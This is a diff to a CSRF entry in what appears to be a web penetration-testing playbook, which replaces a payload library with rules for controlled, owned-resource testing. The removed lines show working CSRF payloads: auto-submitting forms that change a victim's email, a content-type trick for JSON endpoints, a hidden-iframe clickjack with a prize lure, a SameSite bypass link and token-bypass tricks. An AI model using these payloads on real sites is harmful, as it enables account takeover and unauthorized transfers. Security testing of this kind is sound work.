@@ -1,59 +1,26 @@
-# PAYLOADS — CSRF
+# Context payload lookup: csrf all types
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [csrf_all_types.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/csrf_all_types.md).
 
-## 9. CSRF
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-### HTML FORM AUTO-SUBMIT
-```html
-<html><body>
-<form action="https://target.tld/api/email/change" method="POST">
-  <input name="email" value="[email protected]">
-</form>
-<script>document.forms[0].submit();</script>
-</body></html>
-```
+## Select the experiment
 
-### JSON CSRF (CONTENT-TYPE TRICK) / XHR / GET / CLICKJACK
-```html
-<form action="https://target.tld/api/x" method="POST" enctype="text/plain">
-  <input name='{"a":"b","c":"' value='d"}'>
-</form>
-<script>document.forms[0].submit();</script>
-```
-```javascript
-fetch('https://target.tld/api/x', {
-  method:'POST',
-  credentials:'include',
-  headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({email:'[email protected]'})
-});
-```
-```html
-<img src="https://target.tld/transfer?to=attacker&amount=1000">
+- Contexts: Form / navigation / fetch / SameSite / token binding.
+- Reproduce from a controlled attacker origin in a real browser. A JSON fetch may preflight; a token from a different session is meaningful only with that session binding and a real state change.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
-<style>iframe{opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;}</style>
-<iframe src="https://target.tld/transfer?to=attacker&amount=1000"></iframe>
-<button style="position:absolute;top:200px;left:200px;">Win iPhone</button>
-```
+## Return to the owning methodology
 
-### SAMESITE LAX BYPASS
-```html
-<a href="https://target.tld/api/admin/delete?id=999" target="_blank">Click</a>
-<!-- GET endpoints with state-changing effect → lax-bypass -->
-```
-```
-POST /api/x?_method=PUT
-```
-
-### CSRF TOKEN BYPASS
-- Remove the token entirely → check if accepted
-- Submit empty token → check if accepted
-- Submit attacker's token → check if accepted (from another account)
-- Token in URL → leak via Referer
-- Token tied to session but not user → reuse from any account
-- Token never validated for state-changing actions
-- POST → GET conversion
-- Method override (X-HTTP-Method-Override: POST)
-
----
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
